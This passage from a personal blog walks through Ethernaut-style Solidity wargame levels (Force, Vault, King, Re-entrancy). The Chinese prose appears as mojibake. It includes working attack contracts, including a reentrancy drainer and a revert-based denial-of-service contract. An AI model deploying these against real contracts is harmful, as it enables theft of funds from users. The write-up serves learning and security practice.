<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract ForceAttack &#123;</span><br><span class="line">    constructor()  payable &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function destruct(address payable _addr) public &#123;</span><br><span class="line">        selfdestruct(_addr); //åœ¨æ–°ç‰ˆæœ¬å·²è¢«å¼ƒç”¨</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…ˆéƒ¨ç½²10Weiåœ¨æ”»å‡»åˆåŒä¸­, ç„¶åä»¥è¢«æ”»å‡»åˆçº¦åœ°å€ä½œä¸ºæŒ‡å®šåœ°å€å°±å¯ä»¥åœ¨æ”»å‡»åˆçº¦è‡ªæ¯ä¹‹åå°†å…¶å‰©ä½™çš„etherå‘é€ç»™è¢«æ”»å‡»åˆçº¦å³å¯.</p>
<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240414164727354.png" alt="image-20240414164727354"></p>
<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240414164804019.png" alt="image-20240414164804019"></p>
<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240414164813818.png" alt="image-20240414164813818"></p>
<h3 id="8-Vault"><a href="#8-Vault" class="headerlink" title="8. Vault"></a>8. Vault</h3><p>æœ¬å…³è¦æ±‚è§£é”è¿™ä¸ªä¿é™©æŸœ (vault).</p>
<p>æ ¹æ®æºç å¯ä»¥çŸ¥é“, æƒ³è§£é”è¿™ä¸ªåˆçº¦<code>Vault</code>, éœ€è¦çŸ¥é“password:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">contract Vault &#123;</span><br><span class="line">    bool public locked;</span><br><span class="line">    bytes32 private password;</span><br><span class="line"></span><br><span class="line">    constructor(bytes32 _password) &#123;</span><br><span class="line">        locked = true;</span><br><span class="line">        password = _password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function unlock(bytes32 _password) public &#123;</span><br><span class="line">        if (password == _password) &#123;</span><br><span class="line">            locked = false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç°éœ€è¦è·å–<code>password</code>è¿™ä¸ªç§æœ‰å˜é‡, è™½ç„¶<code>password</code>æ˜¯ç§å¯†çš„, ä½†æ˜¯ä¸€åˆ‡å˜é‡éƒ½æ˜¯<strong>å‚¨å­˜åœ¨é“¾ä¸Šçš„</strong>, æ‰€ä»¥æƒ³è·å–<code>password</code>, æ ¹æ®ä»¥ä¸‹æ­¥éª¤:</p>
<p><code>web3.eth.getStorageAt(address, position [, defaultBlock] [, callback])</code>, è¿™ä¸ªå‘½ä»¤å¯ä»¥çœ‹åˆ°å‚¨å­˜åœ¨æŸä¸ªåœ°å€çš„æŸä¸ªå†…å®¹</p>
<p>[^address]: String - The address to get the storage from.<br>[^position]: Number|String|BN|BigNumber - The index position of the storage.</p>
<p>[^[, defaultBlock]]: Number|String|BN|BigNumber - (optional) If you pass this parameter it will not use the default block set with web3.eth.defaultBlock. Pre-defined block numbers as â€œearliestâ€, â€œlatestâ€ and â€œpendingâ€ can also be used.<br>[^[, callback]]: Function - (optional) Optional callback, returns an error object as first parameter and the result as second.</p>
<p>æ¥ä¸‹æ¥, <code>password</code>çš„åœ°å€åœ¨å“ªé‡Œ, è¿™åˆ™éœ€è¦äº†è§£ä»¥å¤ªåŠæ•°æ®å‚¨å­˜çš„è§„åˆ™:</p>
<p>ä»¥å¤ªåŠæ•°æ®å­˜å‚¨ä¼šä¸ºåˆçº¦çš„æ¯é¡¹æ•°æ®æŒ‡å®šä¸€ä¸ªå¯è®¡ç®—çš„å­˜å‚¨ä½ç½®, å­˜æ”¾åœ¨ä¸€ä¸ªå®¹é‡ä¸º2^256çš„è¶…çº§æ•°ç»„ä¸­, æ•°ç»„ä¸­æ¯ä¸ªå…ƒç´ ç§°ä¸ºæ’æ§½(slot), å…¶åˆå§‹å€¼ä¸º0. è™½ç„¶æ•°ç»„å®¹é‡çš„ä¸Šé™å¾ˆé«˜, ä½†å®é™…ä¸Šå­˜å‚¨æ˜¯ç¨€ç–çš„, åªæœ‰éé›¶ (ç©ºå€¼) æ•°æ®æ‰ä¼šè¢«çœŸæ­£å†™å…¥å­˜å‚¨. æ¯ä¸ªæ•°æ®å­˜å‚¨çš„æ’æ§½ä½ç½®æ˜¯ä¸€å®šçš„.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># æ’æ§½å¼æ•°ç»„å­˜å‚¨</span><br><span class="line">----------------------------------</span><br><span class="line">|               0                |     # slot 0</span><br><span class="line">----------------------------------</span><br><span class="line">|               1                |     # slot 1</span><br><span class="line">----------------------------------</span><br><span class="line">|               2                |     # slot 2</span><br><span class="line">----------------------------------</span><br><span class="line">|              ...               |     # ...</span><br><span class="line">----------------------------------</span><br><span class="line">|              ...               |     # æ¯ä¸ªæ’æ§½ 32 å­—èŠ‚</span><br><span class="line">----------------------------------</span><br><span class="line">|              ...               |     # ...</span><br><span class="line">----------------------------------</span><br><span class="line">|            2^256-1             |     # slot 2^256-1</span><br><span class="line">----------------------------------</span><br></pre></td></tr></table></figure>

<p>æ¯ä¸ªæ’æ§½32å­—èŠ‚, å¯¹äºå€¼ç±»å‹, å…¶å­˜æ”¾æ˜¯è¿ç»­çš„, æ»¡è¶³ä»¥ä¸‹è§„å¾‹:</p>
<ul>
<li><p>å­˜å‚¨æ’æ§½çš„ç¬¬ä¸€é¡¹ä¼šä»¥ä½ä½å¯¹é½ (å³å³å¯¹é½) çš„æ–¹å¼å‚¨å­˜;</p>
</li>
<li><p>åŸºæœ¬ç±»å‹ä»…ä½¿ç”¨å­˜å‚¨å®ƒä»¬æ‰€éœ€çš„å­—èŠ‚;</p>
</li>
<li><p>å¦‚æœå­˜å‚¨æ’æ§½ä¸­çš„å‰©ä½™ç©ºé—´ä¸è¶³ä»¥å‚¨å­˜ä¸€ä¸ªåŸºæœ¬ç±»å‹, é‚£ä¹ˆå®ƒä¼šè¢«ç§»å…¥ä¸‹ä¸€ä¸ªå­˜å‚¨æ’æ§½;</p>
</li>
<li><p>ç»“æ„å’Œæ•°ç»„æ•°æ®æ€»æ˜¯ä¼šå ç”¨ä¸€æ•´ä¸ªæ–°æ’æ§½ (ä½†ç»“æ„æˆ–æ•°ç»„ä¸­çš„å„é¡¹, éƒ½ä¼šä»¥è¿™äº›è§„åˆ™è¿›è¡Œæ‰“åŒ…)</p>
</li>
</ul>
<p>ä¸¾ä¸ªä¾‹å­:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract C &#123;</span><br><span class="line">    address a;      // 0</span><br><span class="line">    uint8 b;        // 0</span><br><span class="line">    uint256 c;      // 1</span><br><span class="line">    bytes24 d;      // 2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶å‚¨å­˜ç»“æ„ä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------------------------</span><br><span class="line">| unused (11) | b (1) |            a (20)           | &lt;- slot 0</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                       c (32)                      | &lt;- slot 1</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">| unused (8) |                d (24)                | &lt;- slot 2</span><br><span class="line">-----------------------------------------------------</span><br></pre></td></tr></table></figure>



<p>å›åˆ°æœ¬å…³, å…¶passwordçš„å‚¨å­˜ç»“æ„ä¸º:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------------------------</span><br><span class="line">| unused (31) |           locked(1)                 | &lt;- slot 0</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                       password (32)               | &lt;- slot 1</span><br><span class="line">-----------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>åˆ™<code>password</code>çš„åœ°å€ä¸ºsolt 1, åˆ™é€šè¿‡ä¸Šæ–‡æåˆ°çš„å‘½ä»¤è·å¾—<code>password</code>.</p>
<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240414172613800.png" alt="image-20240414172613800"></p>
<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240414172739760.png" alt="image-20240414172739760"></p>
<h3 id="9-King"><a href="#9-King" class="headerlink" title="9. King"></a>9. King</h3><p>æœ¬å…³è¦æ±‚æ‰“ç ´å½“<code>summit instance</code>çš„æ—¶å€™, å…³å¡ä¼šè‡ªåŠ¨å°†è·å¾—ç‹æƒçš„è¿™ä¸ªâ€è‡ªæˆ‘å®£å‘Šâ€.</p>
<p>æºç ä¸­ç‹æƒè½¬ç§»çš„ä»£ç :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">receive() external payable &#123;</span><br><span class="line">        require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">        payable(king).transfer(msg.value);</span><br><span class="line">        king = msg.sender;</span><br><span class="line">        prize = msg.value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆåœ¨æäº¤å®ä¾‹çš„æ—¶å€™ç‹æƒä¼šè½¬ç§», å› ä¸ºå…³å¡ä¼šåœ¨æäº¤å®ä¾‹æ—¶ä¼šè½¬ç§»etherç»™åˆçº¦, è€Œä½œä¸ºkingçš„æˆ‘ä»¬ä¼šè·å¾—etherå¹¶å°†ç‹æƒè½¬ç§»ç»™å…³å¡, æ‰€ä»¥æˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯æ‰“æ–­è¿™ä¸ªè¿ç»­çš„è¿‡ç¨‹, å¾ˆè‡ªç„¶çš„, æˆ‘ä»¬æƒ³åˆ°çš„æ–¹æ³•å°±æ˜¯<strong>æ‹’ç»æ¥å—ether</strong>, è¿™æ ·å°±ä¸ä¼šå‘ç”Ÿ<code>king = msg.sender</code>çš„ç‹æƒè½¬ç§», æ‰€ä»¥æˆ‘ä»¬éœ€è¦è°ƒç”¨<code>revert</code>å‡½æ•°.</p>
<p>æ”»å‡»åˆçº¦å¦‚ä¸‹:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract KingAttacker &#123;</span><br><span class="line"></span><br><span class="line">    constructor() payable&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(address payable _addr) public payable &#123;</span><br><span class="line">        _addr.call&#123;value : msg.value&#125;(&quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    fallback() external payable&#123;</span><br><span class="line">        revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºåˆçº¦æ—¶æœ‰0.001ether (å³1finney).</p>
<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240414195335301.png" alt="image-20240414195335301"></p>
<p>åˆçº¦çš„ç‹æƒåœ¨å…³å¡æ‰‹ä¸Š</p>
<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240414201845901.png" alt="image-20240414201845901"></p>
<p>**!é”™è¯¯! **åˆ™åœ¨éƒ¨ç½²æ”»å‡»åˆçº¦æ—¶, ä¼ å…¥2finney</p>
<p>åº”è¯¥å…ˆéƒ¨ç½²æ”»å‡»åˆçº¦, åœ¨è°ƒç”¨<code>attack()</code>å‡½æ•°æ—¶ä¼ å…¥2 finney (å› ä¸ºå‘ç”Ÿäº†è¡€çš„æ•™è®­, è™½ç„¶æˆ‘ä¹Ÿä¸å¤ªæ¸…æ¥šä¸ºä»€ä¹ˆä¸èƒ½åœ¨éƒ¨ç½²çš„æ—¶å€™ä¼ å…¥</p>
<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240414195723789.png" alt="image-20240414195723789"></p>
<p>ç„¶å<code>attack</code>åˆçº¦</p>
<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240414195827075.png" alt="image-20240414195827075"></p>
<p>ç°åœ¨åˆçº¦çš„ç‹æƒå±äºæ”»å‡»åˆçº¦</p>
<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240414201912073.png" alt="image-20240414201912073"></p>
<p>ç„¶å<code>submit instance</code>, è¿™ä¸ªè¿‡ç¨‹, å› ä¸ºæœ‰<code>fallback</code>æ–¹æ³•çš„å­˜åœ¨, æ”»å‡»åˆçº¦ä¼šè‡ªåŠ¨æ‹’ç»<code>revert()</code>åˆçº¦çš„è½¬è´¦, ä½¿å¾—ç‹æƒæ— æ³•è¢«è½¬è®©ç»™å…³å¡.</p>
<p>![](C:\Users\wjx27\Pictures\Screenshots\å±å¹•æˆªå›¾ 2024-04-14 201413.png)</p>
<p>(æ²¡é”™, æˆ‘åœ¨ç¬¬9å…³äº†æ‰å‘ç°é¶åœºæœ‰å®˜æ–¹çš„ç®€ä½“ä¸­æ–‡ğŸ˜“, å¾ˆæ˜æ˜¾åº”è¯¥æ˜¯å›½äººç¿»è¯‘çš„)</p>
<h3 id="10-Re-entrancy"><a href="#10-Re-entrancy" class="headerlink" title="10. Re-entrancy"></a>10. Re-entrancy</h3><p>æœ¬å…³çš„ç›®æ ‡æ˜¯å·èµ°åˆçº¦çš„æ‰€æœ‰èµ„äº§.</p>
<p>æºç ä¸­å…³äºè½¬è´¦çš„éƒ¨åˆ†:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function withdraw(uint256 _amount) public &#123;</span><br><span class="line">	if (balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">		(bool result,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">        if (result) &#123;</span><br><span class="line">        	_amount;</span><br><span class="line">        &#125;</span><br><span class="line">        balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªçŠ¯äº†è½¬è´¦æ­¥éª¤ä¸Šçš„é”™è¯¯, å³å…ˆè½¬è´¦å†è®°è´¦ (æ­£å¸¸æƒ…å†µä¸‹åº”è¯¥æ˜¯å…ˆè®°è´¦å†è½¬è´¦), è¿™æˆ–è®¸çœ‹èµ·æ¥æ— ä¼¤å¤§é›…, ä½†æ˜¯åœ¨åŒºå—é“¾ä¸­æˆ‘ä»¬å­¦è¿‡åŒèŠ±é—®é¢˜, ä¸ä¹‹ç±»ä¼¼, å¦‚æœåœ¨æˆ‘ä»¬åœ¨è®°è´¦ä¹‹å‰å¤šæ¬¡å®ç°è½¬è´¦, å³åœ¨æ¥å—åˆçº¦è½¬è´¦çš„åŒæ—¶åˆå‘èµ·æ–°çš„è½¬è´¦.</p>
<p>æ”»å‡»åˆçº¦å¦‚ä¸‹:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface ReentrancyInterface &#123;</span><br><span class="line">    function donate(address _to) external payable;</span><br><span class="line">    function balanceOf(address _who) external view returns (uint256 balance);</span><br><span class="line">    function withdraw(uint256 _amount) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    ReentrancyInterface ReentrancyImpl;  //ç›®æ ‡åˆçº¦</span><br><span class="line">    uint256 requireValue;  //ç›®æ ‡åˆçº¦ä¸­å­˜å‚¨çš„èµ„äº§</span><br><span class="line"></span><br><span class="line">    constructor(address _addr) payable &#123;</span><br><span class="line">        ReentrancyImpl = ReentrancyInterface(_addr);</span><br><span class="line">        requireValue = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBlance(address _addr) public view returns (uint256) &#123;</span><br><span class="line">        return _addr.balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function donate() public &#123;</span><br><span class="line">        ReentrancyImpl.donate&#123;value:requireValue&#125;(address(this));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint _amount) public &#123;</span><br><span class="line">        ReentrancyImpl.withdraw(_amount);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    function destruct() public &#123;</span><br><span class="line">        selfdestruct(payable(msg.sender));  //é€šè¿‡è‡ªæ¯å›æ”¶å‰©ä½™çš„ether</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        uint256 ReentrancyImplValue = address(ReentrancyImpl).balance;</span><br><span class="line">        if (ReentrancyImplValue &gt;= requireValue) &#123;</span><br><span class="line">            withdraw(requireValue);</span><br><span class="line">        &#125;else if (ReentrancyImplValue &gt; 0) &#123;</span><br><span class="line">            withdraw(ReentrancyImplValue);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆçº¦ä¸Šæœ‰0.001ether</p>
<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240421000341989.png" alt="image-20240421000341989"></p>
<p>éƒ¨ç½²0.0005etheråœ¨æ”»å‡»åˆçº¦ä¸­, ä»¥æ»¡è¶³<code>withdraw()</code>çš„è¦æ±‚.</p>
<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240420233028642.png" alt="image-20240420233028642"></p>
<p>è°ƒç”¨<code>donate()</code>å‡½æ•°å°†æ”»å‡»åˆçº¦ä¸­çš„0.0005etherè½¬å…¥ç›®æ ‡åˆçº¦ä¸­, ç°åœ¨ç›®æ ‡åˆçº¦æœ‰0.0015ether.</p>
<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240421001015505.png" alt="image-20240421001015505"></p>
<p>ç°åœ¨æˆ‘ä»¬å‘èµ·æ”»å‡», è°ƒç”¨<code>withdraw()</code>, å–å‡º0.0005ther.</p>
<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240421001223831.png" alt="image-20240421001223831"></p>
<p>æ­¤æ—¶, æˆ‘ä»¬å°±ä¼šå®Œæˆä¸‰æ¬¡è¿ç»­çš„å–æ¬¾ (å–æ¬¾ä¹‹é—´æ²¡æœ‰è®°è´¦), ç›®æ ‡åˆçº¦ä¸­çš„èµ„äº§ä¾¿è¢«å…¨éƒ¨å–èµ°.</p>
<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240421001625127.png" alt="image-20240421001625127"></p>
<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240421001709054.png" alt="image-20240421001709054"></p>
<p>å†é€šè¿‡è‡ªæ¯å›æ”¶ether ï¼ˆå‹¤ä¿­æŒå®¶ing</p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>Fantome</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="https://username.github.io/project/2024/07/26/BlockChain-Learning-Blog-2/">https://username.github.io/project/2024/07/26/BlockChain-Learning-Blog-2/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>Do you believe in <strong>DESTINY</strong>?</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/project/tags/BlockChain/"># BlockChain</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>Â· </span>
                <a href="/project/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/project/2024/07/26/BlockChain-Learning-Blog-3/">BlockChain Learning Blog 3</a>
            
            
            <a class="next" rel="next" href="/project/2024/07/26/BlockChain-Learning-Blog-1/">BlockChain Learning Blog 1</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>Â© Fantome | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>
<div class="theme-info">
    <div class="powered-by"></div>
    <span class="post-count">åšå®¢å…¨ç«™å…±{{ totalcount(site) }}å­—</span>
  </div>  

    </div>
</body>

</html>